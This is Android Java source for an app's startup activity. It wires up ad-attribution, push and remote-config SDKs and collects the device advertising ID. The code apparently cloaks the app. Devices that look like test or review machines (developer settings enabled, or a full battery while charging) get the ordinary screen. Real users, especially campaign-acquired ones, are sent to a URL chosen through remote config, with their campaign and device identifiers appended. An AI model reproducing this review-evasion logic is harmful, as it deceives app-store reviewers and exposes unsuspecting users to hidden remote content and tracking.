package mara.tata.run;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.os.AsyncTask;
import android.os.BatteryManager;
import android.os.Bundle;
import android.widget.ImageView;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.bumptech.glide.Glide;
import com.facebook.FacebookSdk;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.onesignal.OneSignal;

import org.json.JSONObject;

import java.io.IOException;
import java.util.Map;

public class WaitingActivity extends AppCompatActivity {

    ImageView img;
    Saver sv;
    boolean charging;
    String advId = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_waiting);
        img = findViewById(R.id.imageView5);
        sv = new Saver(this);
        Glide.with(this).load(R.drawable.monophy).into(img);

        OneSignal.initWithContext(this);
        OneSignal.setAppId(getResources().getString(R.string.onesignal_id));
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();

        getAddId();

        switch(sv.loadFirstRef()) {
            case 1:
                if (!sv.loadPoint().isEmpty()) {
                    startActivity(new Intent(WaitingActivity.this, MathActivity.class));
                    finish();
                } else {
                    startActivity(new Intent(WaitingActivity.this, MainActivity.class));
                    finish();
                }
                break;
            case 0:
                if (((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo() != null) {
                    connectApps();
                } else {
                    startActivity(new Intent(WaitingActivity.this, MainActivity.class));
                    finish();
                }
                break;
        }
    }

    public void getAddId(){
        AsyncTask.execute(() -> {
            try {
                AdvertisingIdClient.Info adInfo = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext());
                advId = adInfo != null ? adInfo.getId() : null;
            } catch (IOException | GooglePlayServicesRepairableException | GooglePlayServicesNotAvailableException exception) {
            }
        });

    }

    public void connectApps(){
        AppsFlyerLib.getInstance().init(getResources().getString(R.string.appsflyer_id), new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> conversionData) {
                if (sv.loadFirstAppsFlyer()) {
                    FirebaseRemoteConfig firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
                    FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                            .setMinimumFetchIntervalInSeconds(3600)
                            .build();
                    firebaseRemoteConfig.setConfigSettingsAsync(configSettings);
                    firebaseRemoteConfig.fetchAndActivate()
                            .addOnCompleteListener(WaitingActivity.this, new OnCompleteListener<Boolean>() {
                                @Override
                                public void onComplete(@NonNull Task<Boolean> task) {
                                    try {
                                        String gameString = firebaseRemoteConfig.getValue("activit").asString();
                                        JSONObject gameRef = new JSONObject(gameString);
                                        JSONObject jsonObject = new JSONObject(conversionData);
                                        if (jsonObject.optString("af_status").equals("Non-organic")) {
                                            String campaign = jsonObject.optString("campaign");
                                            if (campaign.isEmpty() || campaign.equals("null")) campaign = jsonObject.optString("c");
                                            String[] splitsCampaign = campaign.split("_");
                                            try{
                                                OneSignal.sendTag("user_id", splitsCampaign[2]);
                                            }catch(Exception e){

                                            }
                                            String mainUrl = gameRef.optString("6y345tu") + "?nmg="
                                                    + campaign + "&dv_id="
                                                    + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext())
                                                    + "&avr=" + advId;
                                            sv.savePoint(mainUrl);
                                            appFlush();
                                            startActivity(new Intent(WaitingActivity.this, MathActivity.class));
                                            finish();
                                        } else if (jsonObject.optString("af_status").equals("Organic")) {
                                            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
                                            int batLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                                            isPhonePluggedIn();
                                            if (((batLevel == 100 || batLevel == 90) && charging) || (android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                                                    android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0) != 0)) {
                                                sv.savePoint("");
                                                appFlush();
                                                startActivity(new Intent(WaitingActivity.this, MainActivity.class));
                                                finish();
                                            } else {
                                                String mainUrl = gameRef.optString("6y345tu") + "?nmg=null&dv_id="
                                                        + AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext())
                                                        + "&avr=" + advId;
                                                sv.savePoint(mainUrl);
                                                appFlush();
                                                startActivity(new Intent(WaitingActivity.this, MathActivity.class));
                                                finish();
                                            }
                                        } else {
                                            sv.savePoint("");
                                            appFlush();
                                            startActivity(new Intent(WaitingActivity.this, MainActivity.class));
                                            finish();
                                        }
                                        sv.setFirstAppsFlyer(false);
                                        sv.saveFirstRef(1);
                                        appFlush();
                                    } catch (Exception ex) {
                                    }
                                }
                            });
                }
            }

            @Override
            public void onConversionDataFail(String errorMessage) {
            }

            @Override
            public void onAppOpenAttribution(Map<String, String> attributionData) {
            }

            @Override
            public void onAttributionFailure(String errorMessage) {
            }
        }, this);
        AppsFlyerLib.getInstance().start(this);
        AppsFlyerLib.getInstance().enableFacebookDeferredApplinks(true);
    }

    public void appFlush(){
        AppsFlyerLib.getInstance().unregisterConversionListener();
    }

    public void isPhonePluggedIn() {
        charging = false;
        final Intent batteryIntent;
        batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean batteryCharge = status==BatteryManager.BATTERY_STATUS_CHARGING;
        int chargePlug = batteryIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        if (batteryCharge) {charging=true;}
        if (usbCharge) {charging=true;}
        if (acCharge) {charging=true;}
    }
}